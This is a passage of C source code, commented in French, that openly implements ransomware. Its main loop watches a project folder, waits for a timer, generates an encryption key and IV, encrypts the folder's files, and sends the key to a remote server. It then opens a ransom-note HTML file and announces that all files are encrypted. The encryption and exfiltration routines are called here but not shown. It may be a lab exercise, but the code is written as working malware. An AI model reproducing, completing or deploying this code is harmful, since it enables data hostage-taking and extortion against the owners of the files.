    sleep(1);
    
    // Afficher un message pour informer l'utilisateur du fichier HTML
    printf("\n\033[1;33m[!] Un fichier RANCON.html a été créé. Ouvrez-le dans un navigateur pour voir les instructions.\033[0m\n");
    
    // Ouvrir automatiquement le fichier HTML si possible (selon le système d'exploitation)
    char html_path[1024];
    snprintf(html_path, sizeof(html_path), "%s/RANCON.html", PROJECT_DIR);
    
    #if defined(__linux__) || defined(__APPLE__)
        char command[1024 + 20];
        #if defined(__linux__)
            snprintf(command, sizeof(command), "xdg-open \"%s\" > /dev/null 2>&1 &", html_path);
        #else  // __APPLE__
            snprintf(command, sizeof(command), "open \"%s\" > /dev/null 2>&1 &", html_path);
        #endif
        system(command);
    #endif
    
    LOG_INFO("Ransomware", "⚡ Tous les fichiers sont désormais chiffrés!");
    printf("\n\033[1;31m[!] ⚡ Tous les fichiers sont désormais chiffrés! ⚡\033[0m\n\n");
}

// Fonction pour vérifier si le dossier projet existe
int check_project_directory() {
    DIR *dir = opendir(PROJECT_DIR);
    if (dir) {
        closedir(dir);
        return 1;
    }
    return 0;
}

int main() {
    char current_dir[1024];
    if (getcwd(current_dir, sizeof(current_dir)) != NULL) {
        printf("Répertoire de travail actuel: %s\n", current_dir);
        LOG_INFO_F("Ransomware", "Répertoire de travail actuel: %s", current_dir);
    } else {
        perror("getcwd() error");
        LOG_ERROR("Ransomware", "Erreur lors de la récupération du répertoire courant");
    }
    
    time_t project_detected_time = 0;
    int project_found = 0;
    CryptoParams params;
    
    printf("Ransomware démarré. Surveillance du dossier %s...\n", PROJECT_DIR);
    LOG_INFO_F("Ransomware", "Programme démarré. Surveillance du dossier %s", PROJECT_DIR);
    
    // Initialiser OpenSSL
    OpenSSL_add_all_algorithms();
    ERR_load_crypto_strings();
    
    // Boucle principale de surveillance
    while (1) {
        // Vérifier si le dossier projet existe
        if (!project_found && check_project_directory()) {
            project_found = 1;
            project_detected_time = time(NULL);
            LOG_INFO_F("Ransomware", "Projet détecté à %s. Minuteur démarré (%d secondes)", 
                       ctime(&project_detected_time), ENCRYPTION_DELAY);
            printf("Projet détecté à %s. Minuteur démarré (%d secondes).\n", 
                  ctime(&project_detected_time), ENCRYPTION_DELAY);
        }
        
        // Si le projet a été détecté, vérifier si le délai est écoulé
        if (project_found) {
            time_t current_time = time(NULL);
            int elapsed = (int)difftime(current_time, project_detected_time);
            
            if (elapsed >= ENCRYPTION_DELAY) {
                LOG_WARNING("Ransomware", "Délai écoulé! Début du processus de chiffrement");
                printf("Délai écoulé! Début du processus de chiffrement.\n");
                
                // Générer la clé et le vecteur d'initialisation
                generate_key_iv(&params);
                
                // Chiffrer tous les fichiers du dossier
                encrypt_directory(&params);
                
                // Envoyer la clé et le vecteur d'initialisation au serveur
                if (send_key_iv_to_server(&params)) {
                    LOG_INFO("Ransomware", "Clé et IV envoyés au serveur avec succès");
                    printf("Clé et IV envoyés au serveur avec succès.\n");
                } else {
                    LOG_ERROR("Ransomware", "Erreur lors de l'envoi de la clé et de l'IV au serveur");
                    printf("Erreur lors de l'envoi de la clé et de l'IV au serveur.\n");
                    // La sauvegarde locale a déjà été faite dans send_key_iv_to_server en cas d'échec
                }
                
                // Réinitialiser les variables pour poursuivre la surveillance
                project_found = 0;
                project_detected_time = 0;
            } else {
                int remaining = ENCRYPTION_DELAY - elapsed;
                printf("Temps restant avant chiffrement : %d secondes\n", remaining);
            }
        }
        
        // Attendre avant la prochaine vérification
        sleep(CHECK_INTERVAL);
    }
    
    // Nettoyage OpenSSL (jamais atteint dans ce cas, mais bonnes pratiques)
    EVP_cleanup();
    ERR_free_strings();
    
    return 0;
}
